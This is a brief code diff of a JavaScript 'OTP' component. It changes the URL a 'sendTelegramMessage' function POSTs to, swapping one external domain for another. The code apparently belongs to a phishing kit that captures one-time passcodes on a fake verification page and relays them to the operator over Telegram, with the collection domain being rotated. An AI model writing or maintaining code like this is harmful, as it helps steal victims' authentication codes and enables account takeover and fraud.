@@ -23,7 +23,7 @@ const OTP = () => {
 
   const sendTelegramMessage = async (message) => {
     try {
-      const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', { // Asegúrate de que esta URL es correcta
+      const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', { // Asegúrate de que esta URL es correcta
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
